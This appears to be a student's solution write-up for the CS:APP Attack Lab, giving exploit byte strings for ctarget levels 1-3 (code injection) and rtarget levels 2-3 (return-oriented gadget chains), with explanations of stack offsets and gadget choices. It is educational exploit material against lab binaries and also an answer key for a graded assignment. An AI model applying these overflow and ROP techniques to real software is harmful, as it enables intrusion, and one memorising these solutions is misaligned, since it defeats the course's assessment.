# ctarget

## Level 1
### Bytes to be entered
00 00 00 00 00 00 00 00 

00 00 00 00 00 00 00 00 

00 00 00 00 00 00 00 00 

00 00 00 00 00 00 00 00 

00 00 00 00 00 00 00 00 

C0 17 40 00 00 00 00 00  /* address of touch1() */

### What I did with the string
The size of the stack frame allocated by getbuf() is 0x28 bytes, so the return address is stored in 0x28(%rsp) (before the stack frame is deallocated). I just have to write at that address the starting address of the function touch1(), which is 0x4017c0. 


## Level 2
### Bytes to be entered
bf fa 97 b9 59 68 ec 17 

40 00 c3 00 00 00 00 00 

00 00 00 00 00 00 00 00 

00 00 00 00 00 00 00 00 

00 00 00 00 00 00 00 00 

78 dc 61 55

### What I did with the string
The injected code is stored in (%rsp) (before deallocation), so we just need to return to (%rsp) (before deallocation) after executing the body of getbuf().
That means, starting at the 41st byte, the bytes should be the value of %rsp, which is %5561dc78. Then, starting at the 1st byte, we need to store the injected machine code. The assembly code is stored in level2.s and the disassembled version is in level2.d. I have left a comment for each line of code in level2.s.


## Level 3
### Bytes to be entered
48 c7 c7 a8 dc 61 55 68 

fa 18 40 00 c3 00 00 00 

00 00 00 00 00 00 00 00 

00 00 00 00 00 00 00 00 

00 00 00 00 00 00 00 00 

78 dc 61 55 00 00 00 00 

35 39 62 39 39 37 66 61

### What I did with the string
The injected code can still be stored at (%rsp) (before deallocation), but the string cannot be stored in the stack frame for getbuf(). Because when switching control to injected code, the stack frame for getbuf() is already deallocated. The touch3(), hex(), and injected code will push the stack 5 times in total, completely overwriting the original stack frame. Therefore, we can put the string at 0x8(%rsp). 
Note that the string (cookie) should be given in hex representation.

# rtarget

## Level 2
### Bytes to be entered
00 00 00 00 00 00 00 00 

00 00 00 00 00 00 00 00 

00 00 00 00 00 00 00 00

00 00 00 00 00 00 00 00

00 00 00 00 00 00 00 00

ab 19 40 00 00 00 00 00  /* pop stack to %rax */

fa 97 b9 59 00 00 00 00  /* cookie */

a3 19 40 00 00 00 00 00  /* mov %eax,%edi */

ec 17 40 00 00 00 00 00  /* address of touch2() */

### What I did with the string
Ideally, we should move cookie directly into %rdi, but we cannot do that as we need to execute existing instructions that end with c3 (ret). So the thinking is to put the value on the stack and pop it to a register, which is the only way to insert a custom value of your choice into the code. I cannot find an instruction that pops the stack to %rdi, but there's one that pops to %rax. So we can pop the cookie to %rax first, and then move %eax to %edi. After that, the PC will jump to the address of touch2(). The catch is to remember that after each ret instruction, %rsp += 8.

## Level 3
### Bytes to be entered
00 00 00 00 00 00 00 00 

00 00 00 00 00 00 00 00 

00 00 00 00 00 00 00 00

00 00 00 00 00 00 00 00

00 00 00 00 00 00 00 00

06 1a 40 00 00 00 00 00  /* mov %rsp,%rax */

c5 19 40 00 00 00 00 00  /* mov %rax,%rdi */

ab 19 40 00 00 00 00 00  /* pop stack to %rax */

48 00 00 00 00 00 00 00  /* bias */

dd 19 40 00 00 00 00 00  /* movl %eax,%edx */

34 1a 40 00 00 00 00 00  /* movl %edx,%ecx */

27 1a 40 00 00 00 00 00  /* movl %ecx,%esi */

d6 19 40 00 00 00 00 00  /* add %rdi,%rsi to %rax */

c5 19 40 00 00 00 00 00  /* mov %rax,%rdi */

fa 18 40 00 00 00 00 00  /* address of touch3() */

35 39 62 39 39 37 66 61  /* cookie */

00

### What I did with the string
The difference from level 2 is that this time we must pass the address of the string to %rdi, which is only obtainable through a bias from %rsp. That is to say, we need to add a specific number to %rsp to obtain the address of the cookie, pass it to %rdi, and call touch3(). There's a function called add_xy() in the gadget farm, which we can use to perform the addition. So all we need to do now is to put %rsp and the bias in %rdi and %rsi. 
We've done the former in level2, but there's no instruction to put a value in %rsi. However, there's one that moves %ecx to %esi. There's also one that moves %edx to %ecx, and one that moves %eax to %edx. Then these 3 instructions tackles the problem of moving the bias to %rsi.  
